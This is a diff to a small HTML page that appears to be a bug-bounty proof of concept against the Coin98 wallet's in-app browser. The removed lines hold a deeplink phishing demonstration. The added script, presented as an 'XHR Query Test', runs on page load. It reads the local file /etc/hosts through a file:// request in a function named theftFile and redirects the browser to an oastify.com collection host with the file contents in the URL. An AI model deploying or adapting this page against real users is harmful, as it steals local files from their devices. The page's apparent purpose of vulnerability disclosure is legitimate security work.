@@ -1,13 +1,31 @@
 <!DOCTYPE html>
 <html>
 <header>
-    <title>coin98</title>
+    <title>XHR</title>
+    <script type="text/javascript">
+        function theftFile(path, callback) {
+            var req = new XMLHttpRequest();
+
+            req.open("GET", "file://" + path, true);
+            req.onload = function(e) {
+                callback(req.responseText);
+            }
+            req.onerror = function(e) {
+                callback(null);
+            }
+            req.send();
+        }
+
+        var file = "/etc/hosts";
+
+        theftFile(file, function(contents) {
+            location.href = "https://7air35l2ad47o74ik5q6flvohfn6bwzl.oastify.com/" + encodeURIComponent(contents);
+        });
+    </script>
 </header>
 
 <body>
-    <H1>When browsing other webpages on the mobile phone, if you visit the following deeplink link, you will open the Coin98 wallet and enter the hacker's phishing trap.</H1>
-
-    <p></p>
-    <a href="coin98:dapp/https:%2f%2fwebsite1337.github.io%2findex.html">Click Me</a> </body>
+    <h1>XHR Query Test </h1>
+</body>
 
 </html>
